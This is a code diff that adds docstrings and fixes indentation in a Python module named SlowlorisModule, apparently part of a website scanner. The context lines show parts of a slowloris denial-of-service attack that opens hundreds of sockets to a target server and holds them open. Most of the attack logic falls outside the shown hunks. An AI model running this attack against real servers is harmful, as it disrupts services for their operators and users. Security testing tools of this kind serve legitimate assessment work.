@@ -22,11 +22,24 @@ import requests
 
 
 class SlowlorisModule(object):
+    """
+    Module attacks scanned website. The Method of attack is slowloris.
+    """
     def __init__(self):
+        """
+        Constructor of the class.
+        """
         self._result = {}
         self._id_mod = "dos"
 
     def _loris_attack(self, ip_address, port, q):
+        """
+        Method implements slowloris attack.
+        :param ip_address: Ip address of server.
+        :param port: Port of server.
+        :param q: Message queue between process
+        :return:
+        """
         array_s = list(map(lambda x: socket.socket(socket.AF_INET,
                                                    socket.SOCK_STREAM),
                            list(range(1,250))))
@@ -49,6 +62,11 @@ class SlowlorisModule(object):
             time.sleep(15)
 
     def scan(self, data):
+        """
+        Scanning method.
+        :param data: Ip and port of server. Format: xxx.xxx.xxx.xxx:aaaa
+        :return: None.
+        """
         ip_address = data[0]
         port = data[1]
         q = Queue()
@@ -66,10 +84,18 @@ class SlowlorisModule(object):
             self._result["dos_result"] = "Attack failed!"
 
     def get_id(self):
-            return self._id_mod
+        """
+        Method which returns id of the module
+        :return: Id of module
+        """
+        return self._id_mod
 
     def get_result(self):
-            return self._result
+        """
+        Method which returns id of the Module
+        :return: Dict with results.
+        """
+        return self._result
 
 if __name__ == "__main__":
     m = SlowlorisModule()
